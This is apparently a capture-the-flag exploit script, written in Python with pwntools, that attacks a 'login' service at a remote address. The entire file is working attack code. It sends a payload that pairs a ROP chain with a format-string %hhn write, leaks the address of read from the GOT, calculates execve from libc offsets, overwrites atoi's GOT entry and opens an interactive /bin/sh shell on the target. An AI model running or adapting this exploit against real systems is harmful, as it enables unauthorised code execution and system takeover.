#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

context.log_level = 'debug'
#io = process('./login')
io = remote('58.213.63.30', 4002)
pause()

def login(user, passwd):
    io.recvuntil('Input the username:\n')
    io.sendline(user)
    io.recvuntil('Input the password:\n')
    io.sendline(passwd)

user = ''
user += p32(0x804a014) 
user = user.ljust(133-53)
user += p32(0x80484c0) #puts
user += p32(0x8048465) #pop_ret
user += p32(0x804a00c) #read_got
user += p32(0x804862b) #read_buff
user += p32(0x8048919) #p_p_p_r
user += p32(0x804a030) #atoi_got
user += p32(0x1010101) #read_len
user += p32(0x10101ff) #end_chr
user += p32(0x8048510)
user += p32(0xdeadbeef)
user += p32(0x804a030 + 4)
user += p32(0x804a030 + 11)
user += p32(0x804a030 + 11)

user = user.ljust(133)
user += 'BBCCDD'
user += '%.191x'
user += '%10$hhn\x00'
login(user, '') 

io.recvuntil('\n')
io.recvuntil('\n')
read_addr = u32(io.recvn(4))
log.info('read_addr : ' + hex(read_addr))
#system_addr = read_addr - 890640 + 735152 
execve_addr = read_addr - 891008 + 741024
log.info('execve_addr : ' + hex(execve_addr))

io.send(p32(execve_addr))
io.sendline('/bin/sh\x00\x00\x00\x00\xff')
io.interactive()
